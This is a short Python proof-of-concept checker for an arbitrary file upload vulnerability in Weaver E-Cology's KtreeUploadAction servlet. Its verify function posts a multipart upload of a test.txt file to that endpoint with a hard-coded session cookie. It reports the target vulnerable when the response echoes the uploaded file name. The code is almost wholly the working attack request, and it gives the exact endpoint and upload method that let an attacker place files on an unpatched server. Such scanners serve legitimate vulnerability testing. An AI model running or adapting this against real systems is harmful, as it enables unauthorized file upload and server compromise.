import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Cology-KtreeUploadAction任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Cache-Control': 'max-age=0',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=--------1638451160',
        'Cookie': 'Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test',
        'Upgrade-Insecure-Requests': '1'
    }
    data = '''----------1638451160
    Content-Disposition: form-data; name="test"; filename="test.txt"
    Content-Type: application/octet-stream

    test
    ----------1638451160--'''
    vurl = urllib.parse.urljoin(url, "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and '.txt' in response.text:
            relsult['vulnerable'] = True
        return relsult

    except:
        return relsult